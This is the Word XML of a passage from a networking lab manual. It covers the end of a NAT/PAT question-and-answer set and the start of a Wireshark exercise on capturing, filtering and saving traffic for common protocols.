        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Which device commonly performs NAT?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFFFA23" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A router commonly performs Network Address Translation between internal and external networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2BD640" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is PAT (Port Address Translation)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C71E4F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:PAT, also called NAT Overload, allows multiple devices in a private network to share a single public IP address by using different port numbers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E273FF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E63F796" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0488D96E" w14:textId="79312BA3" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ex.No:12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1109F1A2" w14:textId="2253A3F8" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>TO CAPTURE, SAVE, AND ANALYZE NETWORK TRAFFIC  USING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45878ED2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>WIRESHARK TOOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7EE640" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B542EE5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To capture, save, and analyze network traffic on TCP/UDP/IP/HTTP/ARP/DHCP/ICMP /DNS using Wireshark Tool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5797D497" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C3970B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Install Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EF7E96" w14:textId="5F4D0B93" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Download and install Wireshark from </w:t>
      </w:r>
      <w:hyperlink r:id="rId88" w:history="1">
        <w:r w:rsidR="00AB6281" w:rsidRPr="003411E6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
            <w:sz w:val="28"/>
          </w:rPr>
          <w:t>https://www.wireshark.org/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F6E2383" w14:textId="29C1EF14" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Make sure to install the required packet capture drivers (e.g., WinPcap or Npcap on Windows).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48867A4E" w14:textId="2977AE80" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Start Capturing Traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36DAA553" w14:textId="741FF91B" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Open Wireshark.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DDFE67F" w14:textId="09A46D62" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Select the correct network interface for capturing (Wi-Fi, Ethernet, etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0EDF2B" w14:textId="040503B9" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Click on the interface to start live capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579476D8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3C5F99C0" wp14:editId="3A9A3304">
            <wp:extent cx="4875343" cy="2862994"/>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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4875343" cy="2862994"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A030D4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">3. Apply Capture Filters </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7E3898" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To reduce the amount of data captured, you can apply capture filters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4DD133" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example filters for protocols:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5F4AEC" w14:textId="6B286B23" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>TCP only: tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CA1ED2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBE2764" w14:textId="08A2FB01" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>UDP only: udp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794DE8D3" w14:textId="6F840E62" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ARP only: arp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BD2C21" w14:textId="3828A835" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ICMP only: icmp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FCDC807" w14:textId="0AC9D498" w:rsidR="00AB6281" w:rsidRPr="003411E6" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>DHCP (uses UDP ports 67 and 68): udp port 67 or udp port 68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290D2506" w14:textId="7BED8ECD" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="003411E6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="003411E6">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>DNS (uses UDP or TCP port 53): port 53</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78521CA3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48A3F93E" wp14:editId="559DA2BA">
            <wp:extent cx="5731509" cy="2615041"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="2615041"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EE3DA3" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C9D4F60" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00E72565" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00E72565">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3FB55324" wp14:editId="2A436552">
            <wp:extent cx="5731510" cy="1983105"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="131011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113779" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId91"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1983105"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA41C7F" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C5EFE6C" w14:textId="55A095BD" w:rsidR="00D60EA6" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00473FAE">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4549B8E3" wp14:editId="3846BCAC">
            <wp:extent cx="5731510" cy="2002155"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="867157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157977" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId92"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2002155"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D973043" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CF4C77F" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="012181AB" w14:textId="4EE61D09" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>4. Save Captured Traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED15193" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>When done capturing, go to File &gt; Save As.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7BF2A8" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Save the capture file in .pcapng or .pcap format for later analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D7838B0" w14:textId="2F333B70" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Analyze Captured Traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0823A14B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Wireshark provides powerful tools to filter and analyze packets:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59EF61BB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Display Filters:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F853892" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>You can filter displayed packets without limiting the saved capture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D8199F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Examples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00958FEC" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>TCP: tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3152E4" w14:textId="77777777" w:rsidR="00D60EA6" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
